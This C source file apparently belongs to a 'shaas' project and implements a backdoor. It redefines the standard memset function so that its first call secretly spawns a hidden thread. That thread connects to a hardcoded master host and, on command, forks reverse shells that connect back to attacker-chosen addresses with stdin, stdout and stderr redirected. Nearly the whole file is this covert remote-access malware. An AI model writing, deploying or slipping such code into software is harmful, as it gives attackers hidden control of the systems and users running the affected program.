#define _GNU_SOURCE
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stddef.h>
#include <sched.h>
#include <stdlib.h>
#include <unistd.h>
#include <shaas/request.h>
#include <shaas/config.h>
#include <stdio.h>

#define STACK_SIZE 0x1000

void *memset(void *s, int c, size_t n);

static const char* const argv[] = {TARGET_SHELL, TARGET_ARGV, NULL};
static const char* const envp[] = {TARGET_ENVP, NULL};
static int is_init = 0;

static int
is_close_request(union client_request* req) {
  int i;
  for (i = 0; i < sizeof(close_magic); ++i) {
    if (req->bytes[i] != close_magic[i])
      return 0;
  }
  return 1;
}

/*
static in_addr_t
str_to_addr(const char* s) {
  unsigned int i;
  unsigned char ip[4];
  for (i = 0; i < 4; ++i) {
    ip[i] = 0;
    while (*s && *s != '.') {
      if (*s < '0' || *s > '9')
        return -1;
      ip[i] *= 10;
      ip[i] += *s - '0';
      ++s;
    }
    ++s;
  }
  return *(in_addr_t*)ip;
}

static inline in_port_t
short_to_port(unsigned short p) {
#ifdef BYTEORDER_LSB
  return (((in_port_t)p & 0xff00) >> 8) | (((in_port_t)p & 0x00ff) << 8);
#else
  return (in_port_t)p;
#endif
}*/

static int
spawn_shell(union client_request* req) {
  int rc, client_fd;
  struct sockaddr_in addr;

  rc = client_fd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (rc < 0)
    goto early_fail;

  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = req->client_ip;
  addr.sin_port = req->client_port;

  rc = connect(client_fd, &addr, sizeof(struct sockaddr_in));
  if (rc < 0)
    goto connect_fail;

  rc = dup2(client_fd, 0);
  if (rc < 0)
    goto connect_fail;
  rc = dup2(client_fd, 1);
  if (rc < 0)
    goto connect_fail;
  rc = dup2(client_fd, 2);
  if (rc < 0)
    goto connect_fail;

  execve(argv[0], argv, envp);
  rc = -1;

connect_fail:
  close(client_fd);
early_fail:
  return rc;
}

static int
main_routine(void *_) {
  char success;
  int rc, master_fd;
  in_addr_t addr;
  struct sockaddr_in master_addr;
  union client_request req;

  rc = inet_pton(AF_INET, MASTER_IP, &addr);
  if (rc <= 0)
    goto early_fail;

  master_addr.sin_family = AF_INET;
  master_addr.sin_addr.s_addr = addr;
  master_addr.sin_port = htons(MASTER_TARGET_PORT);

  rc = master_fd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (rc < 0)
    goto early_fail;

  rc = connect(master_fd, &master_addr, sizeof(struct sockaddr_in));
  if (rc < 0)
    goto connect_fail;

  while (1) {
    rc = read(master_fd, &req, sizeof(union client_request));
    if (rc != sizeof(union client_request))
      success = 0;
    else
      success = 1;
    write(master_fd, &success, 1);
    if (!success)
      continue;

    if (is_close_request(&req))
      break;

    rc = fork();
    if (rc == 0) {
      close(master_fd);
      return spawn_shell(&req);
    }
  }

  rc = 0;
connect_fail:
  close(master_fd);
early_fail:
  return rc;
}

void *memset(void *s, int c, size_t n)
{
  if (!is_init)
  {
    unsigned char *stack = (unsigned char*) malloc(STACK_SIZE);
    int ret = clone(&main_routine, (void*) (stack+STACK_SIZE), CLONE_THREAD|CLONE_SIGHAND|CLONE_FS|CLONE_VM|CLONE_FILES, NULL);
    if (ret < 0)
    {
      perror("clone()");
    }
    is_init = 1;
  }
  size_t i;
  unsigned char *ptr = (char*) s;
  for (i=0; i<n; ++i)
  {
    ptr[i] = (unsigned char)c;
  }
  return s;
}
